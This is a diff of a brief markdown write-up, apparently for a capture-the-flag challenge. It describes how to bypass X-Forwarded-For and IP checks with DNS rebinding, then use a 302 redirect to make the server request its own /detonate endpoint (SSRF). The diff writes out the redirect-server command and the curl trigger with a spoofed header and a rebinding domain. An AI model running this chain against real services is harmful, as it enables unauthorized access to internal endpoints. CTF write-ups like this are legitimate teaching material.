@@ -2,19 +2,17 @@
 
 ## Putting together the inital request:
 
-1) 
-X-Forwarded-For bypass:
-- Just include the IP in the header
+1) X-Forwarded-For bypass:
+Include the header with the IP
 
 2) IP check bypass
-Include multiple IPs in a domain or use DNS rebinding (like rbndr.us). DNS Rebinding was the intended solution
+Include multiple IPs in a domain entry or use DNS rebinding (like rbndr.us). DNS Rebinding was the intended solution
 
-3) Triggring detonate and bypass the 127.0.0.1 ip check:
+3) How to use /detonate and satisfy the 127.0.0.1 ip check:
 
-Host redir.py which will send a 302 redirect to SSRF the webserver into making a local request calling the detonate endpoints.
+Send a 302 redirect to SSRF the webserver into making a local request calling the detonate endpoints.
 
 python3 redir.py 80 http://127.0.0.1:15555/detonate?name=supersecretabc123xyz\&url=http://0x0y0z/payload
-
 
 Our trigger looks like this
 curl -H "X-Forwarded-For: 95.173.136.71" kgb.target:15555/scan?url=http://0x0y0z.d5184c01.rbndr.us/
